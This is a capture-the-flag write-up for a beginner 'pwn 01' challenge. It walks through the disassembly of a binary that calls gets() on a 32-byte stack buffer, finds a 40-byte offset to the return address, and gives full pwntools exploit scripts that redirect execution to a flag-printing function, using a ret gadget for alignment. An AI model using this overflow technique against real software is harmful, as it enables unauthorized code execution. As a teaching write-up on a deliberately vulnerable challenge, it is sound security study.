# pwn 01

Category: PWN
Points: 263
Solves: 14
Author: @mrerror0790

Challenge Description:
Can you return my flag here?

nc pwn01.ctf.teamquark.com 65301

Artifact Files:
[pwn01.zip](./pwn01.zip)

## Quick overview

This is just a basic program that seems to take our input and terminate ! Let's see 
how it works under the hood and if we have potential vulnerabilities

## Running the binary

```
┌───────────────────────────────────────────────────────────────────────┐
│ ██████╗ ██╗   ██╗ █████╗ ██████╗ ██╗  ██╗     ██████╗████████╗███████╗│
│██╔═══██╗██║   ██║██╔══██╗██╔══██╗██║ ██╔╝    ██╔════╝╚══██╔══╝██╔════╝│
│██║   ██║██║   ██║███████║██████╔╝█████╔╝     ██║        ██║   █████╗  │
│██║▄▄ ██║██║   ██║██╔══██║██╔══██╗██╔═██╗     ██║        ██║   ██╔══╝  │
│╚██████╔╝╚██████╔╝██║  ██║██║  ██║██║  ██╗    ╚██████╗   ██║   ██║     │
│ ╚══▀▀═╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝     ╚═════╝   ╚═╝   ╚═╝     │
└───────────────────────────────────────────────────────────────────────┘
Yo hackers give me the address to find out my way ............!
>qsdqsd

(binary terminated)
```

## Information Gathering

The file is an ELF 64 executable (LSB) and the following securities are applied
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   67 Symbols	  No	0	
```

Seems we got lucky, there is no canary or PIE but NX is enabled and since libc wasn't given it's unlikely
to be ret2libc or shellcode injection.

## CODE

Reverse Engineering tool : **radare2**


Listing the functions in the binary we get this list : 
```
0x00401080    1     42 entry0
0x004010c0    4     31 sym.deregister_tm_clones
0x004010f0    4     49 sym.register_tm_clones
0x00401130    3     28 sym.__do_global_dtors_aux
0x00401160    1      2 sym.frame_dummy
0x00401290    1      1 sym.__libc_csu_fini
0x00401294    1      9 sym._fini
0x00401162    1     37 sym.way_out
0x00401040    1      6 sym.imp.puts
0x00401050    1      6 sym.imp.system
0x00401230    4     93 sym.__libc_csu_init
0x004010b0    1      1 sym._dl_relocate_static_pie
0x00401187    1    154 main
0x00401030    1      6 sym.imp.putchar
0x00401070    1      6 sym.imp.fflush
0x00401060    1      6 sym.imp.gets
0x00401000    3     23 sym._init
```

we get a lot of standard functions and the main function of the binary but also **sym.way_out**

**way_out**:
```asm
│           0x00401162      55             push rbp
│           0x00401163      4889e5         mov rbp, rsp
│           0x00401166      bf08204000     mov edi, str.Yo_buddy_you_got_me_out..._ ; 0x402008 ; "Yo buddy you got me out...!" ; const char *s
│           0x0040116b      e8d0feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00401170      bf24204000     mov edi, str._bin_cat_flag.txt ; 0x402024 ; "/bin/cat flag.txt" ; const char *string
│           0x00401175      e8d6feffff     call sym.imp.system         ; int system(const char *string)
│           0x0040117a      bf36204000     mov edi, 0x402036           ; '6 @' ; "\n" ; const char *s
│           0x0040117f      e8bcfeffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00401184      90             nop
│           0x00401185      5d             pop rbp
└           0x00401186      c3             ret
```

Seems like the way_out function prints "Yo buddy you got me out...!" and read the flag file.
This seems like we're gonna have to make the program return to this function somehow.

Now let's check the main function for vulnerabilities.

**main**:
```asm
│           0x00401187      55             push rbp
│           0x00401188      4889e5         mov rbp, rsp
│           0x0040118b      4883ec30       sub rsp, 0x30 // Allocates 48 bytes on the stack
│           0x0040118f      897ddc         mov dword [rbp-0x24], edi    ; argc
│           0x00401192      488975d0       mov qword [rbp-0x30], rsi    ; argv
│           0x00401196      bf38204000     mov edi, 0x402038           ; '8 @' ; const char *s
│           0x0040119b      e8a0feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004011a0      bf18214000     mov edi, str._______________ ; 0x402118 ; const char *s
│           0x004011a5      e896feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004011aa      bfd8214000     mov edi, str.________       ; 0x4021d8 ; const char *s
│           0x004011af      e88cfeffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004011b4      bfa8224000     mov edi, str.________________________ ; 0x4022a8 ; const char *s
│           0x004011b9      e882feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004011be      bf58234000     mov edi, str.______________________ ; 0x402358 ; const char *s
│           0x004011c3      e878feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004011c8      bf08244000     mov edi, str._____________________ ; 0x402408 ; const char *s
│           0x004011cd      e86efeffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004011d2      bfc0244000     mov edi, str.__________________________ ; 0x4024c0 ; const char *s
│           0x004011d7      e864feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004011dc      bf68254000     mov edi, str.               ; 0x402568 ; const char *s
│           0x004011e1      e85afeffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004011e6      bf48264000     mov edi, str.Yo_hackers_give_me_the_address_to_find_out_my_way_............_ ; 0x402648 ; "Yo hackers give me the address to find out my way ............!" ; const char *s
│           0x004011eb      e850feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004011f0      bf3e000000     mov edi, 0x3e               ; '>' ; 62 ; int c
│           0x004011f5      e836feffff     call sym.imp.putchar        ; int putchar(int c)
│           0x004011fa      488b054f2e00.  mov rax, qword [obj.stdout] ; obj.__TMC_END__
│                                                                      ; [0x404050:8]=0
│           0x00401201      4889c7         mov rdi, rax                ; FILE *stream
│           0x00401204      e867feffff     call sym.imp.fflush         ; int fflush(FILE *stream)
│           0x00401209      488d45e0       lea rax, [rbp-0x20]
│           0x0040120d      4889c7         mov rdi, rax                ; char *s
│           0x00401210      b800000000     mov eax, 0
│           0x00401215      e846feffff     call sym.imp.gets           ; char *gets(char *s)
│           0x0040121a      b800000000     mov eax, 0
│           0x0040121f      c9             leave
└           0x00401220      c3             ret
```

As we can see here arguments are being copied on the stack:
- argc -> rbp-0x24 (int64_t)
- argv -> rbp-0x30 (8 bytes pointer since this is x64)

And there is a 32 bytes char buffer left to fill the rest of the stack.
Then the program prints a whole bunch of text for the banner and asks
us for input ! 

Now the big red flag is that it's using the function **gets()** which is incredibly famous
for being absolutely trash since it generates buffer overflows like a charity for hackers.

Since we have a 32 bytes buffer, any input over 32 will start writing memory on the stack.
Considering that rbp is pushed on the stack at the start of the function the return address
RIP will jump to after the main function executes is stored at offset **40** from the start of our
buffer.

Now we have all the ingredients for a juicy overflow:
- Buffer overflow in the main frame
- the offset to overwrite RIP
- the address of the function to read the flag

## Building an exploit

```py
#!/usr/bin/env python3

from pwn import *

context.log_level = 'error'
context.binary = elf = ELF('./src/pwn01')
context.arch = 'amd64'
context.endian = 'little'

if args.REMOTE:
    io = remote("pwn01.ctf.teamquark.com", 65301)
else:
    io = elf.process()

io.recvuntil(b'>')

offset = 40
address = elf.symbols['way_out']

payload = b'A' * offset
payload += pack(address)

io.sendline(payload)
io.interactive()
io.close()
```

Running this does print the first message of the way_out function
but seems like we fucked up the stack too much for it to call system afterwards.

A common trick I use in order to fix stacks for function calls
is calling a *ret* gadget on the function address which should rebuild a "healthy" stack around the function call

Using **ROPgadget** we find this, 0x0000000000401016 : ret

```py
#!/usr/bin/env python3

from pwn import *

context.log_level = 'error'
context.binary = elf = ELF('./src/pwn01')
context.arch = 'amd64'
context.endian = 'little'

if args.REMOTE:
    io = remote("pwn01.ctf.teamquark.com", 65301)
else:
    io = elf.process()

io.recvuntil(b'>')

offset = 40
ret_gadget =  0x401016
address = elf.symbols['way_out']

payload = b'A' * offset
payload += pack(ret_gadget)
payload += pack(address)

io.sendline(payload)
io.interactive()
io.close()
```

Now running the exploit we get this :
```
[~/Documents/CTF-Writeups/HackEnvision/pwn01]$ ./exploit.py REMOTE
quarkCTF{i7s_34sY_70_r37uN_0n_f14g}
```

And that's a success ! 
Here is the flag : quarkCTF{i7s_34sY_70_r37uN_0n_f14g}

[Back to home](../../README.md)